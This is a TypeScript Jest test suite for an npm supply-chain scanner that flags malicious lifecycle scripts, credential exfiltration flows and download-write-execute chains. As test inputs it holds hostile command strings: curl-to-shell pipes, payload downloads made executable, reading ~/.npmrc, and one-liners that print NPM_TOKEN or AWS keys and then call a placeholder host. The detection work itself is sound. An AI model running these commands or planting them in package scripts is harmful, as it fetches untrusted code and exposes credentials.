import { EventEmitter } from 'node:events';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import * as childProcess from 'node:child_process';

import { CustomRuleAnalyzer } from '../src/analyzers/custom-rule/custom-rule.analyzer';
import { analyzeP0StaticFlows } from '../src/analyzers/custom-rule/custom-rule-p0-static';
import { MetadataAnalyzer } from '../src/analyzers/metadata/metadata.analyzer';
import { EvidenceNormalizer } from '../src/evidence/normalizer/evidence-normalizer';
import { assessTier1Risk } from '../src/performance/tier1-risk-weighting';

const FIXTURE_ROOT = join(__dirname, 'fixtures', 'custom-rule', 'p0');

async function fixture(name: string): Promise<{ extractedPath: string; packageJson: unknown }> {
  const extractedPath = join(FIXTURE_ROOT, name);
  return {
    extractedPath,
    packageJson: JSON.parse(await readFile(join(extractedPath, 'package.json'), 'utf8')) as unknown,
  };
}

function emptySemgrepProcess(): EventEmitter {
  const process = new EventEmitter() as EventEmitter & {
    stdout: EventEmitter & { setEncoding: jest.Mock };
    stderr: EventEmitter & { setEncoding: jest.Mock };
    kill: jest.Mock;
  };
  process.stdout = Object.assign(new EventEmitter(), { setEncoding: jest.fn() });
  process.stderr = Object.assign(new EventEmitter(), { setEncoding: jest.fn() });
  process.kill = jest.fn(() => true);
  queueMicrotask(() => {
    process.stdout.emit('data', JSON.stringify({ results: [], errors: [] }));
    process.emit('close', 0, null);
  });
  return process;
}

describe('Custom Rule P0 static flows', () => {
  afterEach(() => jest.restoreAllMocks());

  function metadataObservations(result: Awaited<ReturnType<typeof analyzeP0StaticFlows>>) {
    return result.observations.filter(({ locations }) => locations[0]?.type === 'METADATA');
  }

  it('recovers a preinstall download, file write, and execution chain from command text', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        preinstall: 'curl -fsSL https://example.test/payload.js -o /tmp/payload.js && node /tmp/payload.js',
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.remote-download',
      'custom.network-outbound',
      'custom.filesystem.write',
      'custom.process-execution',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'PREINSTALL')).toBe(true);
    expect(observations.every(({ locations }) => locations[0]?.jsonPointer === '/scripts/preinstall')).toBe(true);
    expect(result.relations).toEqual(expect.arrayContaining([
      expect.objectContaining({ relationType: 'DOWNLOAD_TO_WRITE', executionContext: 'PREINSTALL' }),
      expect.objectContaining({ relationType: 'DOWNLOAD_TO_EXECUTE', executionContext: 'PREINSTALL' }),
    ]));
  });

  it('recovers a postinstall download piped into a shell without executing it', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        postinstall: 'curl -fsSL https://example.test/payload.sh | sh',
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.remote-download',
      'custom.network-outbound',
      'custom.process-execution',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'POSTINSTALL')).toBe(true);
    expect(result.relations).toContainEqual(expect.objectContaining({
      relationType: 'DOWNLOAD_TO_EXECUTE',
      executionContext: 'POSTINSTALL',
    }));
  });

  it('recovers inline child-process and file-write behavior in a postinstall command', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        postinstall: `node -e "require('child_process').exec('echo payload > generated.js')"`,
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.process-execution',
      'custom.filesystem.write',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'POSTINSTALL')).toBe(true);
  });

  it('analyzes prepare command content for credential source and remote network behavior', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        prepare: `node -e "console.log(process.env.NPM_TOKEN); fetch('https://example.test')"`,
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.credential-source',
      'custom.network-outbound',
      'custom.remote-download',
      'custom.process-execution',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'PREPARE')).toBe(true);
    expect(observations.every(({ locations }) => locations[0]?.jsonPointer === '/scripts/prepare')).toBe(true);
  });

  it('recognizes Python remote fetch and shell credential sources without executing the command', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        prepare: `python -c "import urllib.request; print($AWS_ACCESS_KEY_ID); urllib.request.urlopen('https://example.test')"`,
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.credential-source',
      'custom.network-outbound',
      'custom.remote-download',
      'custom.process-execution',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'PREPARE')).toBe(true);
  });

  it('analyzes install command content for sensitive file read and shell chaining', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        install: 'cat "$HOME/.npmrc" && curl -fsSL https://example.test/payload.js -o /tmp/payload.js && chmod +x /tmp/payload.js && /tmp/payload.js',
      },
    });
    const observations = metadataObservations(result);

    expect(observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.sensitive-file-access',
      'custom.network-outbound',
      'custom.remote-download',
      'custom.filesystem.write',
      'custom.process-execution',
    ]));
    expect(observations.every(({ data }) => data.executionContext === 'INSTALL')).toBe(true);
    expect(result.relations).toEqual(expect.arrayContaining([
      expect.objectContaining({ relationType: 'DOWNLOAD_TO_WRITE', executionContext: 'INSTALL' }),
      expect.objectContaining({ relationType: 'DOWNLOAD_TO_EXECUTE', executionContext: 'INSTALL' }),
    ]));
  });

  it('does not invent command findings for a benign prepare build wrapper', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: { prepare: 'npm run build' },
    });

    expect(metadataObservations(result)).toEqual([]);
  });

  it('carries lifecycle command evidence through production normalization and Tier 1 weighting', async () => {
    const input = await fixture('negative');
    const context = { requestId: 'request-1', scanId: 'scan-1' };
    const analyzer = new CustomRuleAnalyzer({
      semgrepBin: 'semgrep',
      ruleConfigPath: 'apps/scanner/rules/custom-rule-analyzer.yml',
      timeoutMs: 100,
    });
    jest.spyOn(childProcess, 'spawn')
      .mockImplementation(() => emptySemgrepProcess() as never);

    const maliciousPackageJson = {
      scripts: {
        prepare: 'curl -fsSL https://example.test/payload.js -o /tmp/payload.js && node /tmp/payload.js',
        install: 'cat "$HOME/.npmrc" && curl -fsSL https://example.test/payload.js -o /tmp/payload.js && chmod +x /tmp/payload.js && /tmp/payload.js',
        postinstall: `node -e "console.log(process.env.NPM_TOKEN); fetch('https://example.test')"`,
      },
    };
    const maliciousMetadata = new MetadataAnalyzer().analyzeResult({
      registryMetadata: {},
      packageJson: maliciousPackageJson,
    }, context);
    const maliciousCustom = await analyzer.analyzeResult({
      extractedPath: input.extractedPath,
      packageJson: maliciousPackageJson,
    }, context);
    const maliciousNormalized = new EvidenceNormalizer().normalize({
      requestId: context.requestId,
      scanId: context.scanId,
      subject: {
        ecosystem: 'npm',
        packageName: 'fixture-negative',
        packageVersion: '1.0.0',
        artifactHash: 'a'.repeat(64),
      },
      artifactRoot: input.extractedPath,
      analyzerResults: [maliciousMetadata, maliciousCustom],
    });
    const maliciousRisk = assessTier1Risk({
      findings: [...maliciousMetadata.findings, ...maliciousCustom.findings],
      evidences: maliciousNormalized.atomicEvidences,
    });

    expect(maliciousRisk).toMatchObject({
      malicious: true,
      lifecycleDownloadExecution: true,
      sensitiveReadNetwork: true,
      credentialSourceNetwork: true,
    });
    expect(maliciousNormalized.atomicEvidences.map(({ signal }) => signal.type)).toEqual(
      expect.arrayContaining(['LIFECYCLE_SCRIPT', 'REMOTE_FETCH', 'CHILD_PROCESS']),
    );

    const benignInput = await fixture('lifecycle-process');
    for (const prepare of ['npm run build', 'tsc', 'node-gyp rebuild', 'node -e "console.log(\'setup\')"']) {
      const benignPackageJson = { scripts: { prepare } };
      const benignMetadata = new MetadataAnalyzer().analyzeResult({
        registryMetadata: {},
        packageJson: benignPackageJson,
      }, context);
      const benignCustom = await analyzer.analyzeResult({
        extractedPath: benignInput.extractedPath,
        packageJson: benignPackageJson,
      }, context);
      const benignNormalized = new EvidenceNormalizer().normalize({
        requestId: context.requestId,
        scanId: context.scanId,
        subject: {
          ecosystem: 'npm',
          packageName: 'fixture-negative',
          packageVersion: '1.0.0',
          artifactHash: 'b'.repeat(64),
        },
        artifactRoot: benignInput.extractedPath,
        analyzerResults: [benignMetadata, benignCustom],
      });

      expect(assessTier1Risk({
        findings: [...benignMetadata.findings, ...benignCustom.findings],
        evidences: benignNormalized.atomicEvidences,
      }).malicious).toBe(false);
    }
  });

  it('does not flag a normal lifecycle command merely because it exists or is chained', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, {
      scripts: {
        postinstall: 'echo postinstall && npm run build',
      },
    });

    expect(metadataObservations(result)).toEqual([]);
  });

  it('keeps a normal local lifecycle entry below command-level process findings', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);
    const observations = metadataObservations(result);

    expect(observations).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'custom.lifecycle-entry' }),
    ]));
    expect(observations).not.toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'custom.process-execution' }),
      expect.objectContaining({ ruleId: 'custom.remote-download' }),
      expect.objectContaining({ ruleId: 'custom.filesystem.write' }),
    ]));
  });

  it.each([
    undefined,
    {},
    { scripts: undefined },
    { scripts: null },
    { scripts: 'not-an-object' },
    { scripts: { preinstall: '', postinstall: null } },
  ])('does not fail or invent command findings for absent, empty, or malformed lifecycle input: %j', async (packageJson) => {
    const input = await fixture('negative');
    await expect(analyzeP0StaticFlows(input.extractedPath, packageJson)).resolves.toEqual(
      expect.objectContaining({ observations: expect.any(Array), relations: expect.any(Array) }),
    );
    const result = await analyzeP0StaticFlows(input.extractedPath, packageJson);
    expect(metadataObservations(result)).toEqual([]);
  });

  it('connects a lifecycle local-entry graph to an aliased process call', async () => {
    const input = await fixture('lifecycle-process');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'custom.lifecycle-entry' }),
      expect.objectContaining({
        ruleId: 'custom.process-execution',
        locations: [expect.objectContaining({ path: 'lib/runner.js', startLine: 3 })],
        data: expect.objectContaining({ executionContext: 'POSTINSTALL' }),
      }),
    ]));
    expect(result.relations).toContainEqual(expect.objectContaining({
      relationType: 'LIFECYCLE_TO_PROCESS',
      executionContext: 'POSTINSTALL',
    }));
  });

  it('tracks credential data through an object property and function argument to axios', async () => {
    const input = await fixture('collection-network');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: 'custom.credential-source',
        locations: [expect.objectContaining({ path: 'index.js', startLine: 2 })],
      }),
      expect.objectContaining({
        ruleId: 'custom.network-outbound',
        locations: [expect.objectContaining({ path: 'index.js', startLine: 7 })],
      }),
    ]));
    expect(result.relations).toContainEqual(expect.objectContaining({
      relationType: 'COLLECTION_TO_NETWORK',
      analysisLevel: 'DATA_FLOW',
    }));
  });

  it('detects serialized form data sent to an external endpoint and normalizes the corroborated threat', async () => {
    const input = await fixture('form-data-exfiltration');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'custom.collection-source' }),
      expect.objectContaining({ ruleId: 'custom.network-outbound' }),
      expect.objectContaining({ ruleId: 'threat-network-form-data-exfiltration' }),
    ]));
    expect(result.relations).toContainEqual(expect.objectContaining({
      relationType: 'COLLECTION_TO_NETWORK',
      analysisLevel: 'DATA_FLOW',
    }));

    const analyzer = new CustomRuleAnalyzer({
      semgrepBin: 'semgrep',
      ruleConfigPath: 'apps/scanner/rules/custom-rule-analyzer.yml',
      timeoutMs: 100,
    }, { run: async () => ({
      stdout: JSON.stringify({ results: [], errors: [] }), stderr: '', exitCode: 0, timedOut: false, signal: null,
    }) });
    const custom = await analyzer.analyzeResult(
      { extractedPath: input.extractedPath, packageJson: input.packageJson },
      { requestId: 'request-1', scanId: 'scan-1' },
    );
    const normalized = new EvidenceNormalizer().normalize({
      requestId: 'request-1',
      scanId: 'scan-1',
      subject: {
        ecosystem: 'npm', packageName: 'fixture-form-data-exfiltration', packageVersion: '1.0.0', artifactHash: 'c'.repeat(64),
      },
      artifactRoot: input.extractedPath,
      analyzerResults: [custom],
    });
    const risk = assessTier1Risk({ findings: custom.findings, evidences: normalized.atomicEvidences });

    expect(normalized.errors).toEqual([]);
    expect(normalized.atomicEvidences).toEqual(expect.arrayContaining([
      expect.objectContaining({
        signal: expect.objectContaining({ id: 'capability.network.outbound', type: 'NETWORK_EGRESS' }),
        assertion: expect.objectContaining({ basis: 'DATA_FLOW' }),
      }),
    ]));
    expect(risk).toMatchObject({ malicious: true, threatWithCapability: true });
  });

  it('does not promote same-origin serialized form submission to a threat', async () => {
    const input = await fixture('form-data-normal');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations.map(({ ruleId }) => ruleId)).toEqual(expect.arrayContaining([
      'custom.collection-source',
      'custom.network-outbound',
    ]));
    expect(result.observations).not.toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'threat-network-form-data-exfiltration' }),
    ]));
    expect(result.relations).toContainEqual(expect.objectContaining({ relationType: 'COLLECTION_TO_NETWORK' }));

    const normalized = new EvidenceNormalizer().normalize({
      requestId: 'request-1',
      scanId: 'scan-1',
      subject: {
        ecosystem: 'npm', packageName: 'fixture-form-data-normal', packageVersion: '1.0.0', artifactHash: 'd'.repeat(64),
      },
      artifactRoot: input.extractedPath,
      analyzerResults: [{
        requestId: 'request-1', scanId: 'scan-1', analyzer: 'custom-rule', analyzerVersion: '0.2.0', status: 'SUCCESS',
        findings: result.observations.map((observation, index) => ({
          findingId: `custom-rule:${observation.ruleId}:${index}`,
          ruleId: observation.ruleId,
          type: 'CAPABILITY_PATTERN',
          message: observation.message,
          location: observation.locations[0],
          data: { ...observation.data, locations: observation.locations },
        })),
        errors: [],
      }],
    });

    expect(assessTier1Risk({
      findings: normalized.atomicEvidences.flatMap(({ sources }) => sources.map(({ ruleId }) => ({ ruleId, type: 'CAPABILITY_PATTERN' }))),
      evidences: normalized.atomicEvidences,
    }).malicious).toBe(false);
  });

  it('keeps download, write, and execution Atomic Findings separate and links the chain', async () => {
    const input = await fixture('download-write-execute');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);
    const rules = result.observations.map(({ ruleId }) => ruleId);

    expect(rules).toEqual(expect.arrayContaining([
      'custom.remote-download',
      'custom.filesystem.write',
      'custom.process-execution',
    ]));
    expect(result.relations.map(({ relationType }) => relationType)).toEqual(
      expect.arrayContaining(['DOWNLOAD_TO_WRITE', 'DOWNLOAD_TO_EXECUTE']),
    );
  });

  it('does not infer collection flow or payload execution from negative fixtures', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);
    const relationTypes = result.relations.map(({ relationType }) => relationType);

    expect(relationTypes).not.toContain('COLLECTION_TO_NETWORK');
    expect(relationTypes).not.toContain('DOWNLOAD_TO_EXECUTE');
    expect(relationTypes).not.toContain('LIFECYCLE_TO_PROCESS');
  });

  it('keeps graphql@16.9.0-style template interpolation out of credential sources', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations).not.toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: 'custom.credential-source',
        locations: [expect.objectContaining({ path: 'graphql-template.js' })],
      }),
    ]));
  });

  it('keeps normal build, telemetry, updater, cache, and release automation below harmful flow level', async () => {
    const input = await fixture('negative');
    const result = await analyzeP0StaticFlows(input.extractedPath, input.packageJson);

    expect(result.observations).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: 'custom.filesystem.write',
        locations: [expect.objectContaining({ path: 'build.js' })],
      }),
      expect.objectContaining({
        ruleId: 'custom.network-outbound',
        locations: [expect.objectContaining({ path: 'telemetry.js' })],
      }),
      expect.objectContaining({
        ruleId: 'custom.network-outbound',
        locations: [expect.objectContaining({ path: 'updater.js' })],
      }),
      expect.objectContaining({
        ruleId: 'custom.filesystem.write',
        locations: [expect.objectContaining({ path: 'cache.js' })],
      }),
      expect.objectContaining({
        ruleId: 'custom.filesystem.write',
        locations: [expect.objectContaining({ path: 'release.js' })],
      }),
    ]));
    expect(result.relations).not.toEqual(expect.arrayContaining([
      expect.objectContaining({ relationType: 'COLLECTION_TO_NETWORK' }),
      expect.objectContaining({ relationType: 'DOWNLOAD_TO_EXECUTE' }),
      expect.objectContaining({ relationType: 'LIFECYCLE_TO_PROCESS' }),
    ]));
    expect(result.relations.some(({ sourceKeys, sinkKeys }) =>
      [...sourceKeys, ...sinkKeys].some((key) => key.includes('updater.js')),
    )).toBe(false);
  });

  it.each([
    ['lifecycle-process', ['LIFECYCLE_TO_PROCESS']],
    ['collection-network', ['COLLECTION_TO_NETWORK']],
    ['download-write-execute', ['DOWNLOAD_TO_WRITE', 'DOWNLOAD_TO_EXECUTE']],
  ] as const)(
    'emits deterministic CANDIDATE relations with valid Finding references for %s',
    async (fixtureName, expectedRelationTypes) => {
    const input = await fixture(fixtureName);
    jest.spyOn(childProcess, 'spawn')
      .mockImplementation(() => emptySemgrepProcess() as never);
    const analyzer = new CustomRuleAnalyzer({
      semgrepBin: 'semgrep',
      ruleConfigPath: 'apps/scanner/rules/custom-rule-analyzer.yml',
      timeoutMs: 100,
      ruleVersion: 'p0-v1',
    });

    const first = await analyzer.analyzeResult(input, { requestId: 'request-1', scanId: 'scan-1' });
    const second = await analyzer.analyzeResult(input, { requestId: 'request-1', scanId: 'scan-1' });
    const findingIds = new Set(first.findings.map(({ findingId }) => findingId));

    expect(second.relationCandidates).toEqual(first.relationCandidates);
    expect(first.relationCandidates.map(({ relationType }) => relationType)).toEqual(
      expect.arrayContaining([...expectedRelationTypes]),
    );
    expect(new Set(first.relationCandidates.map(({ relationId }) => relationId)).size)
      .toBe(first.relationCandidates.length);
    for (const relation of first.relationCandidates) {
      expect(relation.status).toBe('CANDIDATE');
      expect(relation.provenance).toMatchObject({
        source: 'CUSTOM_STATIC_RULE',
        analyzer: 'custom-rule',
        analyzerVersion: '0.2.0',
      });
      expect(relation.limitations.length).toBeGreaterThan(0);
      expect([...relation.sourceFindingIds, ...relation.sinkFindingIds]
        .every((findingId) => findingIds.has(findingId))).toBe(true);
      expect(relation.locations.sources.length).toBeGreaterThan(0);
      expect(relation.locations.sinks.length).toBeGreaterThan(0);
    }
  });
});
